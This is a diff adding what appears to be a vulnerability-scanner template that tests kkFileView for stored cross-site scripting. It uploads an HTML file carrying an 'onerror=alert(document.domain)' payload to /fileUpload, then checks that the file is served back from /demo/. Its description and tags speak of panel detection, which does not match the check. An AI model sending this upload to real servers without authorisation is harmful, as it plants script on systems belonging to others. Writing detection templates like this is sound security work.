@@ -1,0 +1,28 @@
+id: kkfileview-upload-xss
+
+info:
+  name: kkFileView Upload - XSS
+  author: zan8in
+  severity: medium
+  description: kkFileView panel was detected.
+  tags: panel,kkfileview
+  created: 2024/01/05
+
+set:
+  randname: randomLowercase(6)
+  rboundary: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /fileUpload
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{randname}}.html\"\r\nContent-Type: text/html\r\n\r\n<img src=z onerror=alert(document.domain)>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
+    expression: response.status == 200 && response.body.bcontains(b'"code":0') && response.body.bcontains(b'"msg":"SUCCESS"')
+  r1:
+    request:
+      method: GET
+      path: /demo/{{randname}}.html
+    expression: response.status == 200 && response.body.bcontains(b"<img src=z onerror=alert(document.domain)>")
+expression: r0() && r1()
